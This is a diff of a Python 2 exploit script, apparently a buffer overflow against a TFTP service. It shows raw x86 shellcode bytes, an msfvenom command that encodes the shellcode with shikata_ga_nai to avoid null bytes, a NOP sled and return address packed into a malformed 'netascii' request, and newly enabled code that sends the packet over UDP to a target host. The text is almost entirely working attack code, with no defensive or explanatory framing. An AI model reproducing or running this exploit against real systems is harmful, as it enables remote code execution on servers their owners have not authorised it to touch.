@@ -45,7 +45,7 @@ payload += "\x66\x68\x01\xbb\x66\x53\x89\xe3\x6a\x10"
 payload += "\x53\x57\x66\xb9\x57\x05\xff\xd6\x50\xb4\x0c\x50\x53"
 payload += "\x57\x53\x66\xb9\xc0\x38\xff\xe6"
 
-exploit = "\x00\x02" + nop +payload + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
+
 
 ## need to stack adjust -3500 from esp
 ## msf-nasm_shell 
@@ -60,18 +60,18 @@ payload = "\x81\xec\xac\x0d\x00\x00" + payload
 ## should be able to use something like "echo payload | msfvenom -b '\x00' -a x86 --platform windows -f hex -o /tmp/atftp"
 ## and capture the result into a file
 payFileName = "/tmp/at.pf"
-payFile = file.open(payFileName, "wb")
+payFile = open(payFileName, "wb")
 payFile.write(payload)
 payFile.close()
 
 payEncodedName = "/tmp/at.pe"
 
-cmd = "cat " + payFileName + "|msfvenom -b '\x00' -a x86 --platform windows -f hex -o " + payEncodedName 
+cmd = "cat " + payFileName +  "| msfvenom -b \'\\x00\' -e x86/shikata_ga_nai -a x86 --platform windows -f hex -o " + payEncodedName 
+print "patience, msfvenom is not the fastest tool in the shed."
+rv = os.system(cmd)
 
-rv = subprocess.call(cmd, shell=True)  # returns the exit code in unix
-print rv
 
-payEncoded = file.open(payEncodedName, "rb")
+payEncoded = open(payEncodedName, "rb")
 encodedPL = payEncoded.read()
 payEncoded.close()
 
@@ -82,12 +82,18 @@ try:
 except:
     print "failed to delete files for cleanup"
 
+#let's make the payload encoded
+
+exploit = "\x00\x02" + nop +encodedPL + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
 
 ## create socket and send
 
-#client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-#client.sendto(exploit, (host,port))
-
+print "Sending payload"
+try:
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    client.sendto(exploit, (host,port))
+finally:
+    client.close()
 
 
 
